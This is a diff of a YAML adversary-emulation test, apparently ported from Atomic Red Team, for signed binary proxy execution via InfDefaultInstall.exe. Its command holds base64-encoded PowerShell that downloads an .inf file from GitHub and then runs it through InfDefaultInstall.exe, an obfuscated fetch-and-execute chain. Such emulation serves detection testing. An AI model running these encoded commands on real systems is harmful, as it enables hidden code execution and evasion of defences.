@@ -1,21 +1,19 @@
-- id: 4353b394-af1b-587e-a818-f311161e3654
+- requirements: []
   name: Soumaia ART Tests - InfDefaultInstall.exe .inf Execution
   description: 'Test execution of a .inf using InfDefaultInstall.exe
 
 
     Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml'
   tactic: stealth
-  technique:
-    attack_id: T1218
-    name: Signed Binary Proxy Execution
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEkAbgBmAGQAZQBmAGEAdQBsAHQAaQBuAHMAdABhAGwAbAAuAGkAbgBmACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABJAG4AZgBkAGUAZgBhAHUAbAB0AGkAbgBzAHQAYQBsAGwALgBpAG4AZgAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADIAMQA4AC8AcwByAGMALwBJAG4AZgBkAGUAZgBhAHUAbAB0AGkAbgBzAHQAYQBsAGwALgBpAG4AZgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwASQBuAGYAZABlAGYAYQB1AGwAdABpAG4AcwB0AGEAbABsAC4AaQBuAGYAIgAKAA==
-          )
-          InfDefaultInstall.exe ".\Infdefaultinstall.inf"
-        payloads:
-        - Infdefaultinstall.inf
+  technique_id: T1218
+  technique_name: Signed Binary Proxy Execution
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - Infdefaultinstall.inf
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEkAbgBmAGQAZQBmAGEAdQBsAHQAaQBuAHMAdABhAGwAbAAuAGkAbgBmACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA= & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABJAG4AZgBkAGUAZgBhAHUAbAB0AGkAbgBzAHQAYQBsAGwALgBpAG4AZgAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADIAMQA4AC8AcwByAGMALwBJAG4AZgBkAGUAZgBhAHUAbAB0AGkAbgBzAHQAYQBsAGwALgBpAG4AZgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwASQBuAGYAZABlAGYAYQB1AGwAdABpAG4AcwB0AGEAbABsAC4AaQBuAGYAIgAKAA== ) & InfDefaultInstall.exe ".\Infdefaultinstall.inf"
+  id: 4353b394-af1b-587e-a818-f311161e3654
